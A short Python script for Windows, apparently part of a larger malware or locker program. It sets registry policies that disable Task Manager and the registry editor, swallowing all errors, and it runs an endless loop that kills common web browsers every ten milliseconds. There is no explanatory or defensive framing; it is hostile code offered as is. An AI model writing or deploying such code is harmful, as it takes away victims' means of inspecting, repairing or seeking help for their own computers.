import winreg,psutil,sys,os,asyncio,time
def disable():
    try:
        reg_key = winreg.HKEY_CURRENT_USER
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
        if not os.path.exists(reg_path):
            reg_key_handle = winreg.CreateKey(reg_key, reg_path)
        else:
            reg_key_handle = winreg.OpenKey(reg_key, reg_path, 0, winreg.KEY_WRITE)
        for reg_value_name in ["DisableTaskMgr", "DisableRegistryTools"]:
            try:
                winreg.SetValueEx(reg_key_handle, reg_value_name, 0, winreg.REG_DWORD, 1)
            except Exception:
                pass
        winreg.CloseKey(reg_key_handle)
    except Exception:
        pass
def nobrowse():
    while True:
        for proc in psutil.process_iter(['pid', 'name']):
            if any(browser in proc.info['name'].lower() for browser in ['chrome.exe', 'google.exe', 'brave.exe', 'opera.exe', 'firefox.exe']):
                proc.terminate()
        time.sleep(0.01)